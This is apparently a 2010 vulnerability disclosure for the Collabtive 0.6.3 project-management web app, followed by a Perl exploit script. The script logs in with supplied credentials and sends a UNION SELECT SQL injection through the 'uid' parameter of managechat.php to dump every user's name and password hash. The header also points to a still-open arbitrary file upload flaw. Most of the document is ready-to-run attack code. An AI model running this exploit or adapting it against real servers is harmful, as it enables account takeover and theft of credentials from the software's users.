#                           \#'#/
#                           (-.-)
#    ------------------oOO---(_)---OOo-----------------
#    |          __             __                     |
#    |    _____/ /_____ ______/ /_  __  ______ ______ |
#    |   / ___/ __/ __ `/ ___/ __ \/ / / / __ `/ ___/ |
#    |  (__  ) /_/ /_/ / /  / /_/ / /_/ / /_/ (__  )  |
#    | /____/\__/\__,_/_/  /_.___/\__,_/\__, /____/   |
#    | Security Research Division      /____/ 2o1o    |
#    --------------------------------------------------
#    |   Collabtive v0.6.3 Multiple Vulnerabilities   |
#    --------------------------------------------------
# [!] Discovered by.: DNX
# [!] Homepage......: http://starbugs.host.sk
# [!] Vendor........: http://collabtive.o-dyn.de
# [!] Detected......: 04.06.2010
# [!] Reported......: 05.06.2010
# [!] Response......: xx.xx.2010
#
# [!] Background....: Collabtive ist eine web-basierte Projektmanagementsoftware.
#                     Das Projekt startete im November 2007. Es ist eine
#                     Open-Source-Software und stellt eine Alternative zu proprietären
#                     Werkzeugen wie Basecamp dar. Collabtive ist in PHP geschrieben.
#
#                     Collabtive wird von einem professionellen Team entwickelt.
#
# [!] Requirements..: Account needed
#
# [!] Bug...........: $_GET['uid'] in managechat.php near line 64
#
#                     12: $userto_id = getArrayVal($_GET, "uid");
#
#                     64: $sel = mysql_query("SELECT * FROM chat WHERE ufrom_id IN($userid,$userto_id) AND userto_id IN($userid,$userto_id) AND time > $start ORDER by time ASC");
#
#                     The password is encoded with sha1.
#
# [!] Bug...........: The arbitrary file upload discovered by USH is still present.
#                     See http://www.milw0rm.com/exploits/7076 more details.
#
 
if(!$ARGV[5])
{
  print "\n                       \\#'#/                   ";
  print "\n                       (-.-)                    ";
  print "\n   ---------------oOO---(_)---OOo---------------";
  print "\n   |  Collabtive v0.6.3 SQL Injection Exploit  |";
  print "\n   |               coded by DNX                |";
  print "\n   ---------------------------------------------";
  print "\n[!] Usage: perl collabtive.pl [Host] [Path] <Options>";
  print "\n[!] Example: perl collabtive.pl 127.0.0.1 /collabtive/ -user test -pass 12345";
  print "\n[!] Options:";
  print "\n       -user [text]    Username";
  print "\n       -pass [text]    Password";
  print "\n       -p [ip:port]    Proxy support";
  print "\n";
  exit;
}
 
my %options = ();
GetOptions(\%options, "user=s", "pass=s", "p=s");
my $ua      = LWP::UserAgent->new();
my $cookie  = HTTP::Cookies->new();
my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $target  = "http://".$host.$path;
my $user    = "";
my $pass    = "";
 
if($options{"p"}) { $ua->proxy('http', "http://".$options{"p"}); }
if($options{"user"}) { $user = $options{"user"}; }
if($options{"pass"}) { $pass = $options{"pass"}; }
 
print "[!] Exploiting...\n\n";
 
exploit();
 
print "\n[!] Done\n";
 
sub exploit
{
  ##############
  # make login #
  ##############
   
  my $url = $target."manageuser.php?action=login";
  my $res = $ua->post($url, [username => $user, pass => $pass]);
  $cookie->extract_cookies($res);
  $ua->cookie_jar($cookie);
   
  ############################
  # get users with passwords #
  ############################
   
  $url = $target."managechat.php?action=pull&uid=0) union select 1,2,name,4,5,6,pass from user/*";
  $res = $ua->get($url);
  my $content = $res->content;
   
  my @c = split(/<br \/>/, $content);
  foreach (@c)
  {
    if($_ =~ /<b>(.*?):<\/b> (.*)/)
    {
      print $1.":".$2."\n";
    }
  }
}